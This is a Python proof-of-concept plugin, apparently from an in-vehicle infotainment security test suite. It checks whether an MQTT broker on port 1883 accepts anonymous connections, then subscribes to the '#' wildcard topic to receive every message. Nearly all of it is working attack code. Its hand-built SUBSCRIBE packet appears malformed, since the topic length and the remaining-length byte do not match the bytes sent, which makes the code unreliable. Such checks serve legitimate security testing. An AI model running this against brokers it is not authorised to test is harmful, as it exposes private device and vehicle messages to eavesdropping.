"""
PoC Name: MQTT Unauthenticated Subscribe
CVE: N/A
Component: Network Stack
Category: Network
Severity: High
CVSS: 7.0
Description: 检测MQTT Broker是否允许匿名连接和通配符订阅
Prerequisites: 目标MQTT端口(1883)开放。
Usage: python3 14_MQTT_Unauth.py <target_ip>
"""
import socket
import struct
import sys
from iv_plugin_base import IVIVulnerabilityPlugin
class MQTTUnauthPlugin(IVIVulnerabilityPlugin):
    def check_prerequisites(self):
        if not self.target_ip:
            raise RuntimeError("需要指定目标IP地址")
        return True
    def exploit(self):
        port = 1883
        self.logger.info(f"MQTT匿名连接测试 {self.target_ip}:{port}...")
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            if s.connect_ex((self.target_ip, port)) != 0:
                self.logger.info("MQTT端口1883关闭")
                self.results["vulnerable"] = False
                s.close()
                return self.results
            # MQTT CONNECT packet (anonymous, no auth)
            client_id = b"poc_test"
            connect = bytearray([0x10])  # CONNECT
            payload = bytearray()
            payload += struct.pack(">H", 4) + b"MQTT"  # Protocol
            payload += bytes([0x04])  # Protocol level 4
            payload += bytes([0x02])  # Clean session, no auth
            payload += struct.pack(">H", 60)  # Keep alive
            payload += struct.pack(">H", len(client_id)) + client_id
            connect += bytes([len(payload)]) + payload
            s.send(connect)
            resp = s.recv(4)
            if len(resp) >= 4 and resp[0] == 0x20:
                rc = resp[3]
                if rc == 0:
                    self.logger.warning("[+] MQTT匿名连接成功！")
                    # Try subscribe to #
                    sub = bytes([0x82, 0x08, 0x00, 0x01, 0x00, 0x03]) + b"#\x00\x00"
                    s.send(sub)
                    self.logger.warning("[+] 已订阅 # (所有主题)")
                    self.results["vulnerable"] = True
                    self.results["evidence"] = "MQTT anonymous auth + wildcard subscribe"
                else:
                    self.logger.info(f"MQTT连接被拒绝 rc={rc}")
                    self.results["vulnerable"] = False
            else:
                self.results["vulnerable"] = False
            s.close()
        except Exception as e:
            self.logger.error(f"MQTT测试失败: {e}")
            self.results["vulnerable"] = False
        return self.results

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 14_MQTT_Unauth.py <target_ip>")
        sys.exit(1)
    plugin = MQTTUnauthPlugin({"target_ip": sys.argv[1]})
    plugin.run_verify()
